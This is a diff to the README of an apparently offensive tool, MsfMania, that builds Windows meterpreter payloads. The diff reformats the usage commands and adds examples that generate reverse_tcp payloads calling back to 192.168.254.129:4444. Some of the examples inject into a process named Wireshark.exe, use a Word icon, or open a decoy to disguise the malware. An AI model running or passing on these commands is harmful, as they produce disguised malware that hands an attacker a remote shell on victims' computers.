@@ -27,12 +27,17 @@ New features:
 
 ## Usage
 ```
-**python3 MsfMania.py -h**
+python3 MsfMania.py -h
 ```
 ```
-**python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local**
+python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local
 ```
-
+```
+python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Virus remote --procname Wireshark.exe --mscript --icon mco.ico
+```
+```
+python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.254.129 4444 Word remote --decoy 2000 --mscript --icon word.ico
+```
 
 ## Features
 - x86/x64 staged payload meterpreter/shell.
